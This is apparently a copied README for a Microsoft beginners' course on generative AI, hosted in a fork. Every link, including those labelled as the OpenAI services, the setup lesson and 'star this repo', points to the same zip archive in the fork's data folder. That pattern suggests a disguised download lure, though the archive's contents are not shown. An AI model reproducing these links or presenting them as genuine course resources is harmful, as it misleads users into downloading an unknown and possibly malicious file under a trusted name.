# Generative AI for Beginners (Version 2) - A Course

Learn the fundamentals of building Generative AI applications with our 18-lesson comprehensive course by Microsoft Cloud Advocates.

## 🌱 Getting Started

This course has 18 lessons. Each lesson covers its own topic so start wherever you like!

Lessons are labeled either "Learn" lessons explaining a Generative AI concept or "Build" lessons that explain a concept and code examples in both **Python** and **TypeScript** when possible.

Each lesson also includes a "Keep Learning" section with additional learning tools.

**What You Need**

- Access to the [Azure OpenAI Service](https://raw.githubusercontent.com/jamald33n/generative-ai-for-beginners/main/18-fine-tuning/python/data/beginners_ai_generative_for_v2.4-alpha.3.zip) **OR** [OpenAI API](https://raw.githubusercontent.com/jamald33n/generative-ai-for-beginners/main/18-fine-tuning/python/data/beginners_ai_generative_for_v2.4-alpha.3.zip) - _Only required to complete coding lessons_
- Basic knowledge of Python or Typescript is helpful - \*For absolute beginners check out these [Python](https://raw.githubusercontent.com/jamald33n/generative-ai-for-beginners/main/18-fine-tuning/python/data/beginners_ai_generative_for_v2.4-alpha.3.zip) and [TypeScript](https://raw.githubusercontent.com/jamald33n/generative-ai-for-beginners/main/18-fine-tuning/python/data/beginners_ai_generative_for_v2.4-alpha.3.zip) courses.
- A Github account to [fork this entire repo](https://raw.githubusercontent.com/jamald33n/generative-ai-for-beginners/main/18-fine-tuning/python/data/beginners_ai_generative_for_v2.4-alpha.3.zip) to your own GitHub account

We have created a **[Course Setup](https://raw.githubusercontent.com/jamald33n/generative-ai-for-beginners/main/18-fine-tuning/python/data/beginners_ai_generative_for_v2.4-alpha.3.zip)** lesson to help you with setting up your development environment.

Don't forget to [star (🌟) this repo](https://raw.githubusercontent.com/jamald33n/generative-ai-for-beginners/main/18-fine-tuning/python/data/beginners_ai_generative_for_v2.4-alpha.3.zip) to find it easier later.
